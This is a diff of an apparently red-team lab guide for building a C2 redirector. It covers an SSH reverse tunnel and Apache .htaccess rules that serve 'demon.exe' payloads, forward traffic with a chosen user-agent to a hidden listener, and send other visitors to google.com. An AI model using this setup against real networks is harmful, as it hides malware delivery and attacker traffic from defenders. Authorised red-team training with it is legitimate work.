@@ -56,7 +56,11 @@ redirector@redirector:~$ sudo vim /etc/ssl/certs/public.crt
 
 ![](./assets/ssl_cert.png)
 
-7. Generate SSH keypair for SSH tunneling.
+7. Create HTTPS Listener for Traffic Redirection.
+
+![](./assets/redirector_listener.png)
+
+8. Generate SSH keypair for SSH tunneling.
 ```
 redirector@redirector:~$ ssh-keygen
 Generating public/private rsa key pair.
@@ -69,7 +73,7 @@ Your public key has been saved in /home/redirector/.ssh/id_rsa.pub
 
 > Copy contents of `/home/redirector/.ssh/id_rsa.pub` and save as `redirector` (identity file) in Attacker Linux
 
-8. On Attacker Linux VM, setup a SSH tunnel to Redirector.
+9. On Attacker Linux VM, setup a SSH tunnel to Redirector.
 ```
 ┌──(kali💀JesusCries)-[~/Desktop]
 └─$ ssh -N -R 8443:localhost:443 -i redirector redirector@192.168.231.129
@@ -81,6 +85,26 @@ redirector@redirector:~$ sudo ss -ltnp
 State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process                                   
 LISTEN          0               128                            127.0.0.1:8443                          0.0.0.0:*              users:(("sshd",pid=1769,fd=9))           
 ```
+
+10. Customize `.htaccess` file under `/var/www/html` and restart Apache service.
+```
+redirector@redirector:~$ sudo vim /var/www/html/.htaccess
+
+RewriteEngine on
+
+RewriteCond %{REQUEST_URI} "demon.exe" [NC,OR]
+RewriteCond %{REQUEST_URI} "demon.bin" [NC]
+RewriteRule ^.*$ "https://localhost:9090%{REQUEST_URI}" [P]
+
+RewriteCond %{HTTP_USER_AGENT} "DuckDuckGo" [NC]
+RewriteRule ^.*$ "https://localhost:8443%{REQUEST_URI}" [P]
+
+RewriteRule ^.*$ "https://www.google.com" [L,R=302]
+
+redirector@redirector:~$ sudo systemctl restart apache2
+```
+
+11. Revisiting `https://192.168.231.129` will redirect you to google.com.
 
 ## Chapter 2: OPSEC & AV/EDR Evasion
 ### Runner
